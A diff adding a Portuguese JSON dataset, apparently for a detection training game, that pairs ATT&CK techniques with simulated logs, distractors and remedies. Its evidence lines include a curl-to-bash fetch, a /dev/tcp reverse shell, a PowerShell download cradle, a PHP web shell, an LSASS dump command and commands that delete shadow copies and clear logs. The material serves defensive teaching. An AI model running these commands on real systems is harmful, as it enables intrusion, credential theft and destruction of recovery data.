@@ -1,0 +1,282 @@
+{
+  "version": 1,
+  "techniques": [
+    {
+      "id": "t-spray", "name": "Pulverização de senhas", "en": "Password Spraying", "attack": "T1110.003", "tactic": "Acesso a credenciais",
+      "tags": ["cred"], "node": "hard-acesso", "severity": 9, "status": "credencial",
+      "source": "Entra ID · logs de entrada",
+      "evidence": [
+        "03:02:11Z signin user=ana.souza@valeverde.coop    ip=185.220.101.47 result=50126 senha inválida\n03:02:13Z signin user=bruno.lima@valeverde.coop   ip=185.220.101.47 result=50126 senha inválida\n03:02:14Z signin user=carla.reis@valeverde.coop   ip=185.220.101.47 result=50126 senha inválida\n03:02:16Z signin user=diego.alves@valeverde.coop  ip=185.220.101.47 result=50126 senha inválida\n... 212 contas distintas · 1 tentativa por conta · mesmo user-agent",
+        "04:10:02Z signin user=eva.matos@valeverde.coop    ip=45.95.147.20 result=50126\n04:10:02Z signin user=fabio.rocha@valeverde.coop  ip=45.95.147.20 result=50126\n04:10:03Z signin user=gabi.nunes@valeverde.coop   ip=45.95.147.20 result=50126\n... 30 min depois, nova rodada: as mesmas 212 contas, de novo 1 tentativa cada"
+      ],
+      "confusers": ["t-guess", "t-valid", "t-mfa-fatigue"],
+      "tell": "Muitas contas, uma tentativa por conta, mesma origem.",
+      "explain": "No spraying o atacante testa uma senha comum (Verao2026!, Empresa@123) contra muitas contas, com poucas tentativas por conta para não disparar o bloqueio. O sinal é a largura: centenas de usuários distintos, cada um com uma falha, a partir da mesma origem e no mesmo intervalo. Força bruta clássica é o oposto: muitas tentativas contra uma conta só.",
+      "counter": "MFA, bloqueio inteligente por origem e rate limiting contêm. Rotacionar senhas limpa credenciais já obtidas."
+    },
+    {
+      "id": "t-guess", "name": "Adivinhação de senha", "en": "Password Guessing", "attack": "T1110.001", "tactic": "Acesso a credenciais",
+      "tags": ["cred"], "node": "hard-acesso", "severity": 8, "status": "credencial",
+      "source": "Windows · log Security do DC",
+      "evidence": [
+        "Security 4625 conta=financeiro01 origem=45.155.205.12 tipo=3 status=0xC000006A\nSecurity 4625 conta=financeiro01 origem=45.155.205.12 tipo=3 status=0xC000006A\nSecurity 4625 conta=financeiro01 origem=45.155.205.12 tipo=3 status=0xC000006A\n... ×48 em 6 min, sempre a mesma conta\nSecurity 4740 a conta financeiro01 foi bloqueada"
+      ],
+      "confusers": ["t-spray", "t-valid", "t-kerberoast"],
+      "tell": "Uma conta, dezenas de falhas seguidas, bloqueio no fim.",
+      "explain": "O 4625 com status 0xC000006A indica senha errada para um usuário que existe. Dezenas de falhas contra a mesma conta, terminando no 4740 (bloqueio), é adivinhação de senha: profundidade numa conta só. O spraying faria o contrário, espalhando poucas tentativas por muitas contas justamente para não chegar ao 4740.",
+      "counter": "MFA e política de bloqueio contêm. Rotacionar a senha limpa a credencial se ela tiver caído."
+    },
+    {
+      "id": "t-valid", "name": "Uso de conta válida", "en": "Valid Accounts", "attack": "T1078", "tactic": "Acesso inicial",
+      "tags": ["cred"], "node": "hard-acesso", "severity": 12, "status": "persistencia",
+      "source": "Entra ID · Identity Protection",
+      "evidence": [
+        "03:58:40Z signin user=carla.reis ip=200.140.33.8    país=BR result=0 sucesso app=Outlook\n04:07:12Z signin user=carla.reis ip=185.220.101.47 país=NL result=0 sucesso app=Exchange Online\nrisco=alto · detecção: viagem impossível (9 min, 9.400 km)\nconta sem método de MFA registrado"
+      ],
+      "confusers": ["t-spray", "t-mfa-fatigue", "t-guess"],
+      "tell": "Login com sucesso, de um lugar impossível, numa conta sem MFA.",
+      "explain": "Aqui não há falha: o login deu certo. O atacante já tem a senha (provavelmente do spraying) e entra como um usuário legítimo, o que dribla controles que só olham falhas. O que denuncia é o contexto: viagem impossível, IP de saída Tor e uma conta sem MFA. É a técnica de contas válidas, que serve tanto de acesso inicial quanto de persistência.",
+      "counter": "Exigir MFA e acesso condicional contêm. Rotacionar a senha e revogar sessões limpa o acesso."
+    },
+    {
+      "id": "t-mfa-fatigue", "name": "Fadiga de MFA", "en": "Multi-Factor Authentication Request Generation", "attack": "T1621", "tactic": "Acesso a credenciais",
+      "tags": ["mfa"], "node": "hard-acesso", "severity": 13, "status": "credencial",
+      "source": "Entra ID · log de MFA",
+      "evidence": [
+        "03:41:02 push MFA user=bruno.lima resultado=negado\n03:41:40 push MFA user=bruno.lima resultado=sem resposta\n03:42:15 push MFA user=bruno.lima resultado=negado\n... 17 pushes em 9 min\n03:50:12 push MFA user=bruno.lima resultado=APROVADO\n03:50:14 signin user=bruno.lima ip=185.220.101.47 result=0"
+      ],
+      "confusers": ["t-valid", "t-spray", "t-int-phish"],
+      "tell": "Rajada de pushes negados até um ser aprovado de madrugada.",
+      "explain": "O atacante tem a senha mas esbarra no MFA. Então dispara pedidos de aprovação em sequência até a vítima, cansada ou confusa às 3 da manhã, apertar Aprovar. Pushes negados em série seguidos de uma aprovação e um login da mesma origem suspeita é o padrão clássico de MFA bombing.",
+      "counter": "MFA com correspondência de número (o usuário digita o código mostrado na tela) contém. Push simples não basta."
+    },
+    {
+      "id": "t-inbox-rule", "name": "Regra de caixa oculta", "en": "Hide Artifacts: Email Hiding Rules", "attack": "T1564.008", "tactic": "Evasão de defesa",
+      "tags": ["mail", "persist"], "node": "ops-siem", "severity": 10, "status": "persistencia",
+      "source": "Microsoft 365 · Unified Audit Log",
+      "evidence": [
+        "Operation=New-InboxRule UserId=carla.reis ClientIP=185.220.101.47\n  Name=\"..\"\n  SubjectOrBodyContainsWords=\"fatura;boleto;pagamento;transferência\"\n  MoveToFolder=\"RSS Subscriptions\"\n  MarkAsRead=True\n  StopProcessingRules=True"
+      ],
+      "confusers": ["t-forward", "t-int-phish", "t-valid"],
+      "tell": "Regra que esconde e-mails de pagamento numa pasta que ninguém abre.",
+      "explain": "Regras de caixa com nome vazio ou \"..\", que movem mensagens com palavras financeiras para pastas esquecidas (RSS, Arquivo morto) e as marcam como lidas, são assinatura de BEC. Servem para a vítima não ver as respostas do fornecedor ou do banco enquanto o atacante conduz a fraude. Note que nada sai da empresa: é ocultação, não encaminhamento.",
+      "counter": "Política que bloqueia regras suspeitas e a purga de regras e mensagens maliciosas contêm."
+    },
+    {
+      "id": "t-forward", "name": "Encaminhamento externo", "en": "Email Forwarding Rule", "attack": "T1114.003", "tactic": "Coleta",
+      "tags": ["mail", "exfil"], "node": "dat-dlp", "severity": 11, "status": "vazamento",
+      "source": "Microsoft 365 · Unified Audit Log",
+      "evidence": [
+        "Operation=Set-Mailbox UserId=carla.reis ClientIP=185.220.101.47\n  ForwardingSmtpAddress=\"smtp:carla.reis.backup@proton.me\"\n  DeliverToMailboxAndForward=True\nprimeira configuração de encaminhamento externo desta caixa"
+      ],
+      "confusers": ["t-inbox-rule", "t-int-phish", "t-dns-exfil"],
+      "tell": "Cópia de toda a caixa sendo enviada para um endereço externo.",
+      "explain": "ForwardingSmtpAddress apontando para um domínio externo, com DeliverToMailboxAndForward ligado, cria uma cópia silenciosa de tudo o que a vítima recebe. A vítima continua vendo seus e-mails, o atacante também. É coleta por encaminhamento: diferente da regra oculta, aqui o dado sai da empresa.",
+      "counter": "DLP e política que proíbe encaminhamento externo contêm. Mascarar dados reduz o que vaza."
+    },
+    {
+      "id": "t-int-phish", "name": "Phishing interno", "en": "Internal Spearphishing", "attack": "T1534", "tactic": "Movimentação lateral",
+      "tags": ["phish", "mail"], "node": "ops-siem", "severity": 30,
+      "source": "Exchange Online · rastreamento de mensagens",
+      "evidence": [
+        "remetente=carla.reis@valeverde.coop (interno, autenticado)\ndestinatários=financeiro@ tesouraria@ diretoria@ (+11)\nassunto=\"URGENTE: novos dados bancários do fornecedor\"\nlink=hxxps://valeverde-coop.sharepoint-docs[.]net/fatura\nSPF=pass DKIM=pass DMARC=pass"
+      ],
+      "confusers": ["t-macro", "t-forward", "t-mfa-fatigue"],
+      "tell": "Phishing que sai de uma conta interna legítima, com SPF e DKIM válidos.",
+      "explain": "SPF, DKIM e DMARC passam porque a mensagem realmente saiu da conta da Carla, que o atacante controla. Por isso filtros de reputação não ajudam. A combinação de urgência, troca de dados bancários e link para um domínio parecido com SharePoint, enviada de dentro, é phishing interno: o atacante usa a confiança na colega para chegar ao financeiro.",
+      "counter": "Purgar a mensagem das caixas e bloquear o domínio contêm. Treinamento e verificação fora de banda evitam o pagamento."
+    },
+    {
+      "id": "t-scan", "name": "Varredura de vulnerabilidades", "en": "Active Scanning: Vulnerability Scanning", "attack": "T1595.002", "tactic": "Reconhecimento",
+      "tags": ["recon"], "node": "ops-vuln", "severity": 6,
+      "source": "nginx · access.log de web01",
+      "evidence": [
+        "203.0.113.66 \"GET /admin.php HTTP/1.1\" 404 ua=\"Mozilla/5.00 (Nikto/2.5.0)\"\n203.0.113.66 \"GET /phpmyadmin/ HTTP/1.1\" 404\n203.0.113.66 \"GET /.git/config HTTP/1.1\" 404\n203.0.113.66 \"GET /backup.zip HTTP/1.1\" 404\n... 4.812 requisições em 3 min · 97% com 404"
+      ],
+      "confusers": ["t-sqli", "t-webshell", "t-dns-exfil"],
+      "tell": "Milhares de 404 em caminhos conhecidos, user-agent de scanner.",
+      "explain": "Rajadas de requisições a caminhos clássicos (/admin, /phpmyadmin, /.git, backups) quase todas com 404, e o user-agent do Nikto, mostram um scanner procurando falhas conhecidas. Ainda não é exploração: é o atacante mapeando a superfície antes de escolher por onde entrar.",
+      "counter": "Firewall e rate limiting contêm. Capturar tráfego também o detecta e corta."
+    },
+    {
+      "id": "t-sqli", "name": "Injeção de SQL", "en": "Exploit Public-Facing Application", "attack": "T1190", "tactic": "Acesso inicial",
+      "tags": ["exploit", "web"], "node": "dev-owasp", "severity": 14, "status": "vazamento",
+      "source": "nginx + log da aplicação",
+      "evidence": [
+        "203.0.113.66 \"GET /produtos?id=7' HTTP/1.1\" 500\napp.log ERRO SQLSTATE[42000]: syntax error near ''7'''\n203.0.113.66 \"GET /produtos?id=7 UNION SELECT NULL,usuario,senha FROM clientes-- HTTP/1.1\" 200 len=48211"
+      ],
+      "confusers": ["t-webshell", "t-scan", "t-unix-shell"],
+      "tell": "Aspas que quebram a query e depois um UNION SELECT com resposta enorme.",
+      "explain": "Primeiro uma aspa simples provoca erro de sintaxe SQL (a aplicação concatena a entrada na query). Depois vem o UNION SELECT, que anexa colunas de outra tabela ao resultado, e a resposta pula para 48 KB. É injeção de SQL explorando uma aplicação exposta: OWASP A05 Injection.",
+      "counter": "Patch virtual no WAF ou patch emergencial contêm. A correção real é consulta parametrizada."
+    },
+    {
+      "id": "t-webshell", "name": "Web shell", "en": "Server Software Component: Web Shell", "attack": "T1505.003", "tactic": "Persistência",
+      "tags": ["web", "persist"], "node": "dev-owasp", "severity": 12, "status": "persistencia",
+      "source": "nginx + varredura de arquivos",
+      "evidence": [
+        "\"POST /perfil/avatar HTTP/1.1\" 200 arquivo=avatar.php.jpg (multipart)\n\"GET /uploads/avatar.php.jpg?c=id HTTP/1.1\" 200 len=54\n\"GET /uploads/avatar.php.jpg?c=cat+/etc/passwd HTTP/1.1\" 200\n/var/www/uploads/avatar.php.jpg: <?php system($_GET['c']); ?>"
+      ],
+      "confusers": ["t-sqli", "t-unix-shell", "t-cron"],
+      "tell": "Upload com extensão dupla que depois responde a comandos via parâmetro.",
+      "explain": "O upload de avatar aceitou um arquivo .php.jpg e o servidor o executa como PHP. A partir daí, cada GET com ?c= roda um comando no sistema. É um web shell: um backdoor dentro do próprio servidor web, que sobrevive a reinícios e dá ao atacante um ponto de apoio persistente.",
+      "counter": "Patch virtual no WAF contém. Endurecer o host e reconstruir a partir do pipeline removem a persistência."
+    },
+    {
+      "id": "t-unix-shell", "name": "Execução por shell Unix", "en": "Command and Scripting Interpreter: Unix Shell", "attack": "T1059.004", "tactic": "Execução",
+      "tags": ["exec"], "node": "hard-linux", "severity": 12,
+      "source": "auditd · web01",
+      "evidence": [
+        "type=EXECVE uid=33(www-data) ppid=php-fpm\n  a0=\"/bin/sh\" a1=\"-c\" a2=\"curl -s http://198.51.100.9/x.sh | bash\"\npstree: php-fpm─┬─sh───bash───curl"
+      ],
+      "confusers": ["t-ps-enc", "t-webshell", "t-cron"],
+      "tell": "O processo do servidor web abrindo um shell que baixa e executa um script.",
+      "explain": "O php-fpm, que só deveria executar PHP, gerou um /bin/sh que baixa um script com curl e o entrega direto ao bash. Processo de serviço web gerando shell é anômalo por definição. É execução via interpretador de comandos Unix, normalmente o passo seguinte a um web shell.",
+      "counter": "Isolar o endpoint via EDR ou GPO/política de execução contêm."
+    },
+    {
+      "id": "t-sudo", "name": "Abuso de sudo", "en": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "attack": "T1548.003", "tactic": "Escalada de privilégio",
+      "tags": ["privesc"], "node": "hard-linux", "severity": 14, "enemyStatus": "root",
+      "source": "auth.log · web01",
+      "evidence": [
+        "sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ;\n      COMMAND=/usr/bin/find . -exec /bin/sh -p ; -quit\n/etc/sudoers.d/legado: www-data ALL=(ALL) NOPASSWD: /usr/bin/find\nid → uid=0(root) gid=0(root)"
+      ],
+      "confusers": ["t-cron", "t-unix-shell", "t-ssh-lateral"],
+      "tell": "Regra NOPASSWD para find, e o find abrindo um shell como root.",
+      "explain": "Uma regra antiga do sudoers deixa o www-data rodar find como root sem senha. O find tem -exec, então basta mandá-lo executar /bin/sh e o shell nasce com uid 0. É escalada de privilégio por abuso de sudo, catalogada no GTFOBins. Lição de hardening: sudo só para binários que não abrem shell.",
+      "counter": "Endurecer o host Linux ou patch emergencial contêm e removem o root do atacante."
+    },
+    {
+      "id": "t-cron", "name": "Persistência por cron", "en": "Scheduled Task/Job: Cron", "attack": "T1053.003", "tactic": "Persistência",
+      "tags": ["persist"], "node": "hard-linux", "severity": 10, "status": "persistencia",
+      "source": "auditd · web01",
+      "evidence": [
+        "type=PATH name=/etc/cron.d/atualiza op=create uid=0\nconteúdo:\n*/5 * * * * root bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'"
+      ],
+      "confusers": ["t-webshell", "t-sudo", "t-unix-shell"],
+      "tell": "Tarefa agendada que reabre uma conexão reversa a cada 5 minutos.",
+      "explain": "Um arquivo novo em /etc/cron.d roda a cada 5 minutos, como root, um bash interativo redirecionado para um IP externo: um reverse shell. Se a conexão cair ou o processo for morto, o cron a reabre. É persistência por tarefa agendada.",
+      "counter": "Endurecer o host Linux contém e limpa a persistência. Reconstruir do pipeline elimina tudo."
+    },
+    {
+      "id": "t-ssh-lateral", "name": "Movimentação por SSH", "en": "Remote Services: SSH", "attack": "T1021.004", "tactic": "Movimentação lateral",
+      "tags": ["lateral"], "node": "net-protocolos", "severity": 15,
+      "source": "auth.log · db01",
+      "evidence": [
+        "db01 sshd: Accepted publickey for deploy from 10.0.2.15 port 51122 ssh2: ED25519 SHA256:q3Jm...\nweb01 → db01: primeiro acesso desta origem em 90 dias\nweb01: /home/deploy/.ssh/id_ed25519 lido por uid=0 às 04:12"
+      ],
+      "confusers": ["t-psexec", "t-valid", "t-sudo"],
+      "tell": "Chave privada lida no web01 e usada minutos depois para entrar no banco.",
+      "explain": "Com root no web01, o atacante leu a chave privada do usuário deploy e a usou para entrar no servidor de banco por SSH. O login é tecnicamente válido (chave correta), mas a origem nunca tinha acessado o db01. É movimentação lateral por serviço remoto, usando credenciais roubadas do host anterior.",
+      "counter": "Microssegmentação e endurecimento do SSH contêm. Isolar o endpoint via EDR também corta."
+    },
+    {
+      "id": "t-dns-exfil", "name": "Exfiltração por DNS", "en": "Exfiltration Over Alternative Protocol", "attack": "T1048.003", "tactic": "Exfiltração",
+      "tags": ["exfil", "c2"], "node": "net-fundamentos", "severity": 34,
+      "source": "resolver DNS interno",
+      "evidence": [
+        "db01 → resolver  mnygmo3on5wwko3fnvqws3a.k7.cdn-sync[.]xyz  TXT\ndb01 → resolver  ga2dqlrsgiys4ojtg4wtcmb3.k7.cdn-sync[.]xyz  TXT\ndb01 → resolver  mfxgcidtn52xuyj3mfxgcqa.k7.cdn-sync[.]xyz  TXT\n... 38.000 consultas/h · subdomínios base32 · domínio registrado há 2 dias"
+      ],
+      "confusers": ["t-forward", "t-scan", "t-ssh-lateral"],
+      "tell": "Subdomínios longos e aleatórios em base32, num volume absurdo, para um domínio novo.",
+      "explain": "Servidor de banco não faz 38 mil consultas DNS por hora. Os subdomínios são dados codificados em base32 (o primeiro decodifica para \"cpf;nome;email\"): o atacante fatia a base e a envia pedaço por pedaço dentro das consultas, que atravessam o firewall porque DNS quase nunca é bloqueado. É exfiltração por protocolo alternativo.",
+      "counter": "Firewall com filtragem de DNS, inspeção de tráfego e DLP contêm."
+    },
+    {
+      "id": "t-macro", "name": "Anexo com macro", "en": "Phishing: Spearphishing Attachment", "attack": "T1566.001", "tactic": "Acesso inicial",
+      "tags": ["phish", "exec"], "node": "ops-siem", "severity": 12,
+      "source": "gateway de e-mail + Sysmon",
+      "evidence": [
+        "gateway  de=nfe@notafiscal-sefaz[.]com  anexo=NFe_88213.docm  veredito=entregue\nSysmon 1  ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n          Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n          User=VALEVERDE\\joana.prado"
+      ],
+      "confusers": ["t-int-phish", "t-ps-enc", "t-lsass"],
+      "tell": "Um .docm externo entregue e, em seguida, o Word gerando PowerShell.",
+      "explain": "O anexo .docm (documento com macro) veio de um domínio que imita a Sefaz. Logo depois, o Sysmon registra o WINWORD.EXE como pai de um powershell.exe: a macro foi habilitada e executou código. Word abrindo shell é um dos sinais mais confiáveis de phishing com anexo malicioso.",
+      "counter": "Purgar e-mails maliciosos contém. GPO bloqueando macros de arquivos da internet evita a execução."
+    },
+    {
+      "id": "t-ps-enc", "name": "PowerShell ofuscado", "en": "Command and Scripting Interpreter: PowerShell", "attack": "T1059.001", "tactic": "Execução",
+      "tags": ["exec"], "node": "hard-windows", "severity": 13, "status": "persistencia",
+      "source": "Sysmon + PowerShell Operational",
+      "evidence": [
+        "Sysmon 1  Image=powershell.exe\n  CommandLine=powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi...\nPowerShell 4104  ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a')"
+      ],
+      "confusers": ["t-unix-shell", "t-macro", "t-clear-logs"],
+      "tell": "-nop -w hidden -enc: janela oculta e comando em Base64 que baixa e executa.",
+      "explain": "-nop ignora o perfil, -w hidden esconde a janela e -enc recebe o comando em Base64 (UTF-16LE). O log 4104 (Script Block Logging) mostra o conteúdo decodificado: IEX baixando e executando código direto na memória. É execução via PowerShell, com ofuscação para driblar quem só olha a linha de comando.",
+      "counter": "Isolar o endpoint ou GPO de contenção (modo de linguagem restrita, AMSI) contêm."
+    },
+    {
+      "id": "t-lsass", "name": "Dump da memória do LSASS", "en": "OS Credential Dumping: LSASS Memory", "attack": "T1003.001", "tactic": "Acesso a credenciais",
+      "tags": ["dump"], "node": "hard-windows", "severity": 14, "status": "credencial",
+      "source": "Sysmon · WS-JOANA",
+      "evidence": [
+        "Sysmon 10  SourceImage=C:\\Windows\\System32\\rundll32.exe\n           TargetImage=C:\\Windows\\System32\\lsass.exe  GrantedAccess=0x1FFFFF\nSysmon 1   CommandLine=rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\l.dmp full"
+      ],
+      "confusers": ["t-kerberoast", "t-ps-enc", "t-psexec"],
+      "tell": "rundll32 com comsvcs.dll MiniDump abrindo o lsass com acesso total.",
+      "explain": "O LSASS guarda hashes e tickets de quem fez logon na máquina. O comsvcs.dll tem uma função MiniDump legítima que, chamada via rundll32 com o PID do lsass, grava a memória dele em disco: depois é só extrair as credenciais offline. O Sysmon 10 mostra o acesso ao processo, o Sysmon 1 mostra o comando. É dump de credenciais do LSASS, sem precisar de Mimikatz no host.",
+      "counter": "GPO de contenção (Credential Guard, proteção RunAsPPL) contém. Rotacionar segredos limpa o que vazou."
+    },
+    {
+      "id": "t-kerberoast", "name": "Kerberoasting", "en": "Steal or Forge Kerberos Tickets: Kerberoasting", "attack": "T1558.003", "tactic": "Acesso a credenciais",
+      "tags": ["dump", "cred"], "node": "hard-acesso", "severity": 13, "status": "credencial",
+      "source": "DC01 · log Security",
+      "evidence": [
+        "4769 conta=joana.prado serviço=svc_sql     cifra=0x17 (RC4-HMAC)\n4769 conta=joana.prado serviço=svc_backup  cifra=0x17 (RC4-HMAC)\n4769 conta=joana.prado serviço=svc_web     cifra=0x17 (RC4-HMAC)\n... 31 SPNs distintos em 40 s · padrão do domínio é AES (0x12)"
+      ],
+      "confusers": ["t-lsass", "t-guess", "t-psexec"],
+      "tell": "Pedidos de ticket de serviço em massa, forçando RC4.",
+      "explain": "Qualquer usuário do domínio pode pedir tickets de serviço (TGS) para contas com SPN. O ticket vem cifrado com a senha da conta de serviço, então pode ser quebrado offline. Pedir dezenas de SPNs em segundos, exigindo RC4 (0x17, mais fraco) num domínio que usa AES, é Kerberoasting. A defesa é senha longa nas contas de serviço, gMSA e desabilitar RC4.",
+      "counter": "Rotacionar segredos e GPO de contenção contêm. MFA não ajuda aqui: o ataque é offline."
+    },
+    {
+      "id": "t-psexec", "name": "Movimentação por SMB/PsExec", "en": "Remote Services: SMB/Windows Admin Shares", "attack": "T1021.002", "tactic": "Movimentação lateral",
+      "tags": ["lateral"], "node": "hard-windows", "severity": 16,
+      "source": "FS01 · Security e System",
+      "evidence": [
+        "5145 compartilhamento=\\\\*\\ADMIN$ arquivo=PSEXESVC.exe conta=VALEVERDE\\svc_backup\n7045 serviço instalado: PSEXESVC  caminho=%SystemRoot%\\PSEXESVC.exe\n4624 tipo=3 conta=svc_backup origem=WS-JOANA (10.0.5.41)"
+      ],
+      "confusers": ["t-ssh-lateral", "t-kerberoast", "t-encrypt"],
+      "tell": "Arquivo copiado no ADMIN$ e um serviço novo chamado PSEXESVC.",
+      "explain": "O PsExec copia um binário para o compartilhamento administrativo ADMIN$ (5145), instala e inicia um serviço remoto (7045) e roda comandos por ele. O logon de rede (4624 tipo 3) vem da estação da Joana usando a conta svc_backup, cuja senha caiu no Kerberoasting. É movimentação lateral por SMB e compartilhamentos administrativos.",
+      "counter": "GPO de contenção (LAPS, bloqueio de ADMIN$), microssegmentação e isolamento via EDR contêm."
+    },
+    {
+      "id": "t-clear-logs", "name": "Limpeza de logs", "en": "Indicator Removal: Clear Windows Event Logs", "attack": "T1070.001", "tactic": "Evasão de defesa",
+      "tags": ["evasion"], "node": "ops-logs", "severity": 10, "status": "cegueira",
+      "source": "DC01 e FS01",
+      "evidence": [
+        "DC01 Security 1102  O log de auditoria foi limpo. conta=VALEVERDE\\svc_backup\nFS01 System 104  O arquivo de log System foi limpo.\nEDR (antes da limpeza): wevtutil cl Security"
+      ],
+      "confusers": ["t-vss", "t-ps-enc", "t-lsass"],
+      "tell": "Evento 1102: alguém apagou o log de auditoria.",
+      "explain": "O 1102 é registrado quando o log Security é limpo, e o 104 quando outro log é limpo. O comando wevtutil cl confirma. O atacante apaga rastros antes do impacto. Por isso logs precisam ir para um SIEM em tempo real: o que já foi coletado não some com a limpeza local.",
+      "counter": "Correlacionar no SIEM contém. Sem isso, você perde visibilidade."
+    },
+    {
+      "id": "t-vss", "name": "Sabotagem da recuperação", "en": "Inhibit System Recovery", "attack": "T1490", "tactic": "Impacto",
+      "tags": ["impact"], "node": "dat-backup", "severity": 14, "status": "sem-backup",
+      "source": "EDR · FS01",
+      "evidence": [
+        "EDR FS01  vssadmin.exe delete shadows /all /quiet\nEDR FS01  wbadmin delete catalog -quiet\nEDR FS01  bcdedit /set {default} recoveryenabled No"
+      ],
+      "confusers": ["t-encrypt", "t-clear-logs", "t-psexec"],
+      "tell": "Apagar shadow copies e catálogo de backup: preparação para ransomware.",
+      "explain": "Apagar as shadow copies (vssadmin), o catálogo do Windows Backup (wbadmin) e desligar a recuperação de boot (bcdedit) não rouba nada: tira da vítima o caminho de volta. Quase todo ransomware faz isso minutos antes de cifrar. Ver esses três comandos juntos é alarme máximo. Cópias imutáveis e fora do domínio sobrevivem a isso.",
+      "counter": "Restaurar cópia imutável contém. GPO de contenção também bloqueia."
+    },
+    {
+      "id": "t-encrypt", "name": "Cifragem para impacto", "en": "Data Encrypted for Impact", "attack": "T1486", "tactic": "Impacto",
+      "tags": ["impact"], "node": "dat-backup", "severity": 40,
+      "source": "EDR · FS01",
+      "evidence": [
+        "EDR FS01  processo=svch0st.exe renomeações=18.402 em 90 s extensão=.cofre\n\\\\FS01\\Financeiro\\balanco_2026.xlsx → balanco_2026.xlsx.cofre\n\\\\FS01\\Financeiro\\LEIA-ME_COFRE.txt criado\nentropia média dos arquivos gravados: 7,99 bits/byte"
+      ],
+      "confusers": ["t-vss", "t-psexec", "t-clear-logs"],
+      "tell": "Renomeação em massa com extensão nova, nota de resgate e entropia perto de 8.",
+      "explain": "Milhares de arquivos renomeados por minuto, uma extensão desconhecida, uma nota de resgate e entropia de quase 8 bits por byte (dado indistinguível de aleatório) é cifragem em andamento. Repare no processo svch0st.exe, com zero no lugar do o, imitando o svchost. Este é o objetivo final do afiliado de ransomware.",
+      "counter": "Restaurar cópia imutável contém. Isolar o endpoint corta o processo."
+    }
+  ]
+}
